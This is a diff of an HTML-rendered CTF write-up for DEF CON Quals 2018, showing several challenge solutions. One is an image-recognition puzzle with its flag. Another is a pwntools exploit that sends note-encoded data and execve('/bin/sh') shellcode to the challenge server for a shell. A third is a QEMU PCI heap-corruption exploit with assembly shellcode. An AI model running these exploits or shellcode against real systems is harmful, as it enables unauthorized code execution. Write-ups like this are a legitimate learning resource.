-            <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">text</span>[idx] != flag[idx] <span class="hljs-keyword">and</span> flag[idx] == c ) <span class="hljs-keyword">or</span> s &gt; score <span class="hljs-keyword">or</span> random.random() &lt; (<span class="hljs-number">100</span>/(i+<span class="hljs-number">100</span> + z *<span class="hljs-number">10</span>)) ** <span class="hljs-number">4</span>:
-                <span class="hljs-keyword">text</span>[idx] = c
-                bar.desc = <span class="hljs-comment">'%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)</span>
-                score = s
-                img = cur
-        tqdm.write(<span class="hljs-comment">''.join(text))</span>
-        bar.close()</code></pre><ul class="list">
-<li>Part 2<ul class="list">
+model = load_model(<span class="hljs-string">'model.h5'</span>)
+model = Model(input=model.input, output=model.layers[<span class="hljs-number">-2</span>].output)
+
+data = [np.asarray(Image.open(<span class="hljs-string">'sample_%d.png'</span> % i)).reshape(<span class="hljs-number">28</span>, <span class="hljs-number">1064</span>).astype(np.float) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)]
+data = [im <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> im <span class="hljs-keyword">in</span> np.split(d, <span class="hljs-number">38</span>, axis=<span class="hljs-number">1</span>)]
+char = <span class="hljs-string">''</span>.join([
+    <span class="hljs-string">'RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIUI'</span>,
+    <span class="hljs-string">'MOLDERINGIINTELSDEDICINGCOYNESSDEFIECT'</span>,
+    <span class="hljs-string">'AMADOFIFESINSTIIIINGGREEDIIVDISIOCATIN'</span>,
+    <span class="hljs-string">'HAMIETSENSITIZINGNARRATIVERECAPTURINGU'</span>,
+    <span class="hljs-string">'EIECTROENCEPHAIOGRAMSPALATECONDOIESPEN'</span>,
+    <span class="hljs-string">'SCHWINNUFAMANAGEABLECORKSSEMICIRCIESSH'</span>,
+    <span class="hljs-string">'BENEDICTTURGIDITYDSYCHESPHANTASMAGORIA'</span>,
+    <span class="hljs-string">'TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW'</span>,
+    <span class="hljs-string">'KINGFISHERCOMMONERSUERIFIESHORNETAUSTI'</span>,
+    <span class="hljs-string">'LIQUORHEMSTITCHESRESPITEACORNSGOALREDI'</span>,
+])
+data = list(zip(data, char))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">softmax</span><span class="hljs-params">(x)</span>:</span>
+    <span class="hljs-string">"""Compute softmax values for each sets of scores in x."""</span>
+    e_x = np.exp(x - np.max(x))
+    <span class="hljs-keyword">return</span> e_x / e_x.sum()
+
+
+<span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> trange(<span class="hljs-number">100</span>):
+    <span class="hljs-keyword">if</span> reset <span class="hljs-keyword">or</span> z == <span class="hljs-number">0</span>:
+        img, text = zip(*random.sample(data, <span class="hljs-number">38</span>))
+        img = np.concatenate(img, <span class="hljs-number">1</span>).reshape(<span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1064</span>, <span class="hljs-number">1</span>)
+        text = list(text)
+        r = model.predict([img])[<span class="hljs-number">0</span>]
+        score = r[dim]
+    bar = trange(<span class="hljs-number">1000</span>)
+    bar.desc = <span class="hljs-string">'%s: %.1f ( %4d )'</span> % (<span class="hljs-string">''</span>.join(text), softmax(r)[dim], score)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bar:
+        cur = img.copy()
+        <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+            idx = random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>)
+            im, c = random.sample(data, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
+            <span class="hljs-keyword">if</span> text[idx] != flag[idx] <span class="hljs-keyword">or</span> flag[idx] == c:
+                <span class="hljs-keyword">break</span>
+        cur[<span class="hljs-number">0</span>,:, idx*<span class="hljs-number">28</span>:(idx+<span class="hljs-number">1</span>)*<span class="hljs-number">28</span>,<span class="hljs-number">0</span>] = im
+        r = model.predict([cur])[<span class="hljs-number">0</span>]
+        s = r[dim]
+        <span class="hljs-keyword">if</span> ( text[idx] != flag[idx] <span class="hljs-keyword">and</span> flag[idx] == c ) <span class="hljs-keyword">or</span> s &gt; score <span class="hljs-keyword">or</span> random.random() &lt; (<span class="hljs-number">100</span>/(i+<span class="hljs-number">100</span> + z *<span class="hljs-number">10</span>)) ** <span class="hljs-number">4</span>:
+            text[idx] = c
+            bar.desc = <span class="hljs-string">'%s: %.1f ( %4d )'</span> % (<span class="hljs-string">''</span>.join(text), softmax(r)[dim], score)
+            score = s
+            img = cur
+    tqdm.write(<span class="hljs-string">''</span>.join(text))
+    bar.close()</code></pre><ul class="list">
+<li><p>Part 2</p>
+<ul class="list">
 <li>Use dictionary and trie to find all the possible sentences.</li>
 <li>Dictionary: <a href="https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt">https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt</a></li>
 <li>Remember to remove the useless words that length is in range 1~3.</li>
-<li>Code:<pre class="hljs"><code>  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
+<li><p>Code:</p>
+<pre class="hljs"><code>  <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span>
   <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> f first</span>
   <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> s second</span>
   <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;
@@ -768,7 +806,8 @@ for i in range(4,70):
       <span class="hljs-comment">//for(int i=0;i&lt;38;i++)</span>
       <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
   }</code></pre></li>
-<li>input<pre class="hljs"><code>  [The Dictionary]
+<li><p>input</p>
+<pre class="hljs"><code>  [The Dictionary]
   <span class="hljs-number">0</span>
   OOOTOYEUUTHTNTICINTELLIGENCEISREQUIRED
   OOOTOYEGUTHTNTICINTELLIGENCEISREQUIRED
@@ -824,125 +863,134 @@ for i in range(4,70):
   OOOIDMEUMTURWYJCINTELLIGENCEISREQUIRED
   OOOLDMEUMTURWYLCINTELLIGENCEISREQUIRED
   <span class="hljs-number">0</span></code></pre></li>
-<li>Flag
-  <code>OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED</code><h3 id="note-oriented-programming"><a class="header-link" href="#note-oriented-programming"></a>Note Oriented Programming</h3>
-</li>
+<li>Flag: <code>OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED</code></li>
 </ul>
 </li>
+</ul>
+<h3 id="note-oriented-programming"><a class="header-link" href="#note-oriented-programming"></a>Note Oriented Programming</h3>
+<ul class="list">
 <li>Setup the value on the stack and call sys_sigreturn</li>
 <li>After that, eax = 0x3 ebx=0x0 ecx=0x6060654f edx=0x4f4f4f4f cs=0x23 ss=0x2b ds=0x2b</li>
 <li>Now eip is 0x60606565 pointer to &quot;int 0x80&quot; to call sys_read</li>
-<li>Then, write shellcode on the 0x6060654f to get shell
-<code>`</code>python=
-from <strong>future</strong> import print_function
-import sys
-import struct
-import hashlib
-from pwn import *<h1 id="inspired-by-c3ctf's-pow"><a class="header-link" href="#inspired-by-c3ctf's-pow"></a>inspired by C3CTF&#39;s POW</h1>
-</li>
+<li>Then, write shellcode on the 0x6060654f to get shell</li>
 </ul>
-<p>table = [&#39;A&#39; , &#39;A#&#39; , &#39;B&#39; , &#39;C&#39; , &#39;C#&#39; , &#39;D&#39; , &#39;D#&#39; , &#39;E&#39; , &#39;F&#39; , &#39;F#&#39; , &#39;G&#39; , &#39;G#&#39;]</p>
-<p>def val(x):
-        a = table.index(x[:-1])<em>1.0
-        b = float(x[-1])
-        return (2.0**(b+a/12.0))</em>27.5</p>
-<p>cmd = [&quot;F9&quot;,&quot;G0&quot;]<em>0xe
-cmd += [&quot;G9&quot;,&quot;G0&quot;]</em>0x40
-cmd += [&quot;A2&quot;,&quot;G0&quot;,&quot;A0&quot;,&quot;G0&quot;]
-cmd += [&quot;G0&quot;,&quot;G0&quot;]<em>0xb
-cmd += [&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;G9&quot;,&quot;E0&quot;]
-cmd += [&quot;G0&quot;,&quot;G0&quot;]
-cmd += [&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;G9&quot;,&quot;E0&quot;]
-cmd += [&quot;G0&quot;,&quot;G0&quot;]</em>0x17
-cmd += [&quot;G9&quot;,&quot;G0&quot;]<em>0x6
-cmd += [&quot;A2&quot;,&quot;F8&quot;] 
-cmd += [&quot;A0&quot;,&quot;G0&quot;]
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;D9&quot;,&quot;E0&quot;]
-cmd += [&quot;A0&quot;,&quot;G1&quot;] 
-cmd += [&quot;A0&quot;,&quot;G2&quot;] 
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;D9&quot;,&quot;E0&quot;,&quot;A2&quot;,&quot;F8&quot;]
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;B9&quot;,&quot;E0&quot;] 
-cmd += [&quot;A0&quot;,&quot;G3&quot;] 
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;B9&quot;,&quot;E0&quot;] 
-cmd += [&quot;A0&quot;,&quot;G4&quot;] 
-cmd += [&quot;A0&quot;,&quot;G5&quot;] 
-cmd += [&quot;A0&quot;,&quot;G6&quot;] 
-cmd += [&quot;G9&quot;,&quot;G0&quot;]</em>6
-cmd += [&quot;G0&quot;,&quot;G0&quot;]<em>8 
-cmd += [&quot;G9&quot;,&quot;G0&quot;]
-cmd += [&quot;A2&quot;,&quot;F8&quot;]
-cmd += [&quot;A0&quot;,&quot;G0&quot;]
-cmd += [&quot;A0&quot;,&quot;G1&quot;] 
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;D9&quot;,&quot;E0&quot;] 
-cmd += [&quot;A0&quot;,&quot;G2&quot;] 
-cmd += [&quot;A0&quot;,&quot;G3&quot;]
-cmd += [&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;D9&quot;,&quot;E0&quot;,&quot;A2&quot;,&quot;F9&quot;,&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;F9&quot;,&quot;E0&quot;]
-cmd += [&quot;A0&quot;,&quot;G4&quot;]
-cmd += [&quot;A2&quot;,&quot;F9&quot;,&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;F9&quot;,&quot;E0&quot;,&quot;A2&quot;,&quot;F8&quot;] 
-cmd += [&quot;G9&quot;,&quot;G0&quot;]</em>4
-cmd += [&quot;G0&quot;,&quot;G0&quot;]<em>0xb
-cmd += [&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;G9&quot;,&quot;E0&quot;]
-cmd += [&quot;G0&quot;,&quot;G0&quot;] 
-cmd += [&quot;A2&quot;,&quot;F2&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;G9&quot;,&quot;E0&quot;] 
-cmd += [&quot;G0&quot;,&quot;G0&quot;]</em>0xc
-cmd += [&quot;F9&quot;,&quot;G0&quot;]<em>0x7 
-cmd += [&quot;A2&quot;,&quot;F8&quot;,&quot;A4&quot;,&quot;A9&quot;,&quot;E0&quot;,&quot;A4&quot;,&quot;B9&quot;,&quot;E0&quot;,&quot;G2&quot;,&quot;G0&quot;]
-cmd += [&quot;D9&quot;,&quot;G0&quot;]</em>(0x70-0x1f)+[&quot;D#7&quot;]*0x1f</p>
-<p>def pow_hash(challenge, solution):
-    return hashlib.sha256(challenge.encode(&#39;ascii&#39;) + struct.pack(&#39;&lt;Q&#39;, solution)).hexdigest()</p>
-<p>def check_pow(challenge, n, solution):
+<pre class="hljs"><code><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> struct
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment"># inspired by C3CTF's POW</span>
+
+table = [<span class="hljs-string">'A'</span> , <span class="hljs-string">'A#'</span> , <span class="hljs-string">'B'</span> , <span class="hljs-string">'C'</span> , <span class="hljs-string">'C#'</span> , <span class="hljs-string">'D'</span> , <span class="hljs-string">'D#'</span> , <span class="hljs-string">'E'</span> , <span class="hljs-string">'F'</span> , <span class="hljs-string">'F#'</span> , <span class="hljs-string">'G'</span> , <span class="hljs-string">'G#'</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">val</span><span class="hljs-params">(x)</span>:</span>
+        a = table.index(x[:<span class="hljs-number">-1</span>])*<span class="hljs-number">1.0</span>
+        b = float(x[<span class="hljs-number">-1</span>])
+        <span class="hljs-keyword">return</span> (<span class="hljs-number">2.0</span>**(b+a/<span class="hljs-number">12.0</span>))*<span class="hljs-number">27.5</span>
+
+
+cmd = [<span class="hljs-string">"F9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0xe</span>
+cmd += [<span class="hljs-string">"G9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0x40</span>
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"G0"</span>,<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0xb</span>
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"G9"</span>,<span class="hljs-string">"E0"</span>]
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"G9"</span>,<span class="hljs-string">"E0"</span>]
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0x17</span>
+cmd += [<span class="hljs-string">"G9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0x6</span>
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F8"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"D9"</span>,<span class="hljs-string">"E0"</span>]
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G1"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G2"</span>] 
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"D9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F8"</span>]
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"B9"</span>,<span class="hljs-string">"E0"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G3"</span>] 
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"B9"</span>,<span class="hljs-string">"E0"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G4"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G5"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G6"</span>] 
+cmd += [<span class="hljs-string">"G9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">6</span>
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">8</span> 
+cmd += [<span class="hljs-string">"G9"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F8"</span>]
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G1"</span>] 
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"D9"</span>,<span class="hljs-string">"E0"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G2"</span>] 
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G3"</span>]
+cmd += [<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"D9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F9"</span>,<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"F9"</span>,<span class="hljs-string">"E0"</span>]
+cmd += [<span class="hljs-string">"A0"</span>,<span class="hljs-string">"G4"</span>]
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F9"</span>,<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"F9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F8"</span>] 
+cmd += [<span class="hljs-string">"G9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">4</span>
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0xb</span>
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"G9"</span>,<span class="hljs-string">"E0"</span>]
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>] 
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F2"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"G9"</span>,<span class="hljs-string">"E0"</span>] 
+cmd += [<span class="hljs-string">"G0"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0xc</span>
+cmd += [<span class="hljs-string">"F9"</span>,<span class="hljs-string">"G0"</span>]*<span class="hljs-number">0x7</span> 
+cmd += [<span class="hljs-string">"A2"</span>,<span class="hljs-string">"F8"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"A9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"A4"</span>,<span class="hljs-string">"B9"</span>,<span class="hljs-string">"E0"</span>,<span class="hljs-string">"G2"</span>,<span class="hljs-string">"G0"</span>]
+cmd += [<span class="hljs-string">"D9"</span>,<span class="hljs-string">"G0"</span>]*(<span class="hljs-number">0x70</span><span class="hljs-number">-0x1f</span>)+[<span class="hljs-string">"D#7"</span>]*<span class="hljs-number">0x1f</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pow_hash</span><span class="hljs-params">(challenge, solution)</span>:</span>
+    <span class="hljs-keyword">return</span> hashlib.sha256(challenge.encode(<span class="hljs-string">'ascii'</span>) + struct.pack(<span class="hljs-string">'&lt;Q'</span>, solution)).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_pow</span><span class="hljs-params">(challenge, n, solution)</span>:</span>
     h = pow_hash(challenge, solution)
-    return (int(h, 16) % (2**n)) == 0</p>
-<p>def solve_pow(challenge, n):
-    candidate = 0
-    while True:
-        if check_pow(challenge, n, candidate):
-            return candidate
-        candidate += 1</p>
-<p>if <strong>name</strong> == &#39;<strong>main</strong>&#39;:
-    r = remote(&quot;4e6b5b46.quals2018.oooverflow.io&quot;,31337)
-    r.recvuntil(&quot;Challenge: &quot;)
-    challenge = r.recvline()[:-1]
-    r.recvuntil(&quot;n: &quot;)
-    n = int(r.recvline()[:-1])
-    print(&#39;Solving challenge: &quot;{}&quot;, n: {}&#39;.format(challenge, n))</p>
-<pre class="hljs"><code>solution = solve_pow(challenge, n)
-print(<span class="hljs-string">'Solution: {} -&gt; {}'</span>.format(solution, pow_hash(challenge, solution)))
-r.sendlineafter(<span class="hljs-string">"Solution:"</span>,str(solution))
+    <span class="hljs-keyword">return</span> (int(h, <span class="hljs-number">16</span>) % (<span class="hljs-number">2</span>**n)) == <span class="hljs-number">0</span>
 
-<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cmd:
-    r.send(p16(val(c)))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_pow</span><span class="hljs-params">(challenge, n)</span>:</span>
+    candidate = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        <span class="hljs-keyword">if</span> check_pow(challenge, n, candidate):
+            <span class="hljs-keyword">return</span> candidate
+        candidate += <span class="hljs-number">1</span>
 
-r.send(p16(<span class="hljs-number">0x0</span>))
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    r = remote(<span class="hljs-string">"4e6b5b46.quals2018.oooverflow.io"</span>,<span class="hljs-number">31337</span>)
+    r.recvuntil(<span class="hljs-string">"Challenge: "</span>)
+    challenge = r.recvline()[:<span class="hljs-number">-1</span>]
+    r.recvuntil(<span class="hljs-string">"n: "</span>)
+    n = int(r.recvline()[:<span class="hljs-number">-1</span>])
+    print(<span class="hljs-string">'Solving challenge: "{}", n: {}'</span>.format(challenge, n))
 
-payload = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">0x18</span>
-payload += asm(<span class="hljs-string">"""
-mov esp,0x40404a00
-push 0x0068732f
-push 0x6e69622f
-mov eax,0xb
-mov ebx,esp
-xor ecx,ecx
-xor edx,edx
-int 0x80
-"""</span>)
-r.send(payload)
-r.interactive()</code></pre><pre class="hljs"><code>## From The Grill
+    solution = solve_pow(challenge, n)
+    print(<span class="hljs-string">'Solution: {} -&gt; {}'</span>.format(solution, pow_hash(challenge, solution)))
+    r.sendlineafter(<span class="hljs-string">"Solution:"</span>,str(solution))
 
-##<span class="hljs-meta"># elastic cloud compute (memory) corruption</span>
+    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cmd:
+        r.send(p16(val(c)))
 
-* It will use qemu-system-x86_64 to boot a vm
-* It tells us, we need to <span class="hljs-keyword">do</span> something with PCI device
-* Then I found <span class="hljs-keyword">this</span> [writeup](https:<span class="hljs-comment">//kitctf.de/writeups/hitb2017/babyqemu)</span>
-* Now we know that we need to exploit via `/sys/devices/pci0000:<span class="hljs-number">00</span>/<span class="hljs-number">0000</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04.0</span>/resource0`
-* Decompile qemu-system-x86_64 and look <span class="hljs-keyword">for</span> mmio read write function.
-* I only leveraged write funtion
-* There is a buffer which is located at `<span class="hljs-number">0x1317940</span>` and three kinds of operations
-* You can `<span class="hljs-built_in">malloc</span>` `<span class="hljs-built_in">free</span>` `write` some chunks. And all the chunk will be on that buffer
-* I <span class="hljs-built_in">list</span> the write function here:
-```c
-<span class="hljs-keyword">void</span> __fastcall OOO_mmio_write(__int64 a1, __int64 offset, __int64 value, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4)
-{
+    r.send(p16(<span class="hljs-number">0x0</span>))
+
+    payload = <span class="hljs-string">"\x90"</span>*<span class="hljs-number">0x18</span>
+    payload += asm(<span class="hljs-string">"""
+    mov esp,0x40404a00
+    push 0x0068732f
+    push 0x6e69622f
+    mov eax,0xb
+    mov ebx,esp
+    xor ecx,ecx
+    xor edx,edx
+    int 0x80
+    """</span>)
+    r.send(payload)
+    r.interactive()
+</code></pre><h2 id="from-the-grill"><a class="header-link" href="#from-the-grill"></a>From The Grill</h2>
+<h3 id="elastic-cloud-compute-(memory)-corruption"><a class="header-link" href="#elastic-cloud-compute-(memory)-corruption"></a>elastic cloud compute (memory) corruption</h3>
+<ul class="list">
+<li>It will use qemu-system-x86_64 to boot a vm</li>
+<li>It tells us, we need to do something with PCI device</li>
+<li>Then I found this <a href="https://kitctf.de/writeups/hitb2017/babyqemu">writeup</a></li>
+<li>Now we know that we need to exploit via <code>/sys/devices/pci0000:00/0000:00:04.0/resource0</code></li>
+<li>Decompile qemu-system-x86_64 and look for mmio read write function.</li>
+<li>I only leveraged write funtion</li>
+<li>There is a buffer which is located at <code>0x1317940</code> and three kinds of operations</li>
+<li>You can <code>malloc</code> <code>free</code> <code>write</code> some chunks. And all the chunk will be on that buffer</li>
+<li>I list the write function here:</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">void</span> __<span class="hljs-function">fastcall <span class="hljs-title">OOO_mmio_write</span><span class="hljs-params">(__int64 a1, __int64 offset, __int64 value, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4)</span>
+</span>{
   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// eax@1</span>
   <span class="hljs-keyword">char</span> n[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [sp+4h] [bp-3Ch]@1</span>
   __int64 v6; <span class="hljs-comment">// [sp+10h] [bp-30h]@1</span>
@@ -998,86 +1046,92 @@ r.interactive()</code></pre><pre class="hljs"><code>## From The Grill
 <li>Use GOT-hijacking then you can run that magic function and get the flag</li>
 <li>Unfortunately we cannot upload a binary on remote vm, becasue the vm has no network connection. We can base64 encode our binary and send it to the vm. But the binary needs to be small enough, or you cannot send the whole binary because of network conditon.</li>
 <li>So I write some shellcode for exploit.</li>
-<li>The shellcode:<pre class="hljs"><code><span class="hljs-meta">section</span> .data
-  msg <span class="hljs-built_in">db</span>      <span class="hljs-string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>
-<span class="hljs-meta">section</span> .text
-  <span class="hljs-meta">global</span> _start
-<span class="hljs-symbol">_start:</span>
-  <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>
-  <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, msg
-  <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span>
-  <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>
-  <span class="hljs-keyword">syscall</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0x1000000</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-number">3</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r10</span>, <span class="hljs-number">1</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>, <span class="hljs-built_in">rax</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>, <span class="hljs-number">0</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-number">9</span>
-  <span class="hljs-keyword">syscall</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">WORD</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x20000</span>],<span class="hljs-number">0xc</span>             # malloc a chunk on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
-  <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">BYTE</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">0x120000</span>],<span class="hljs-number">0xc</span>            # free the chunk on <span class="hljs-number">0x1317940</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">2</span>
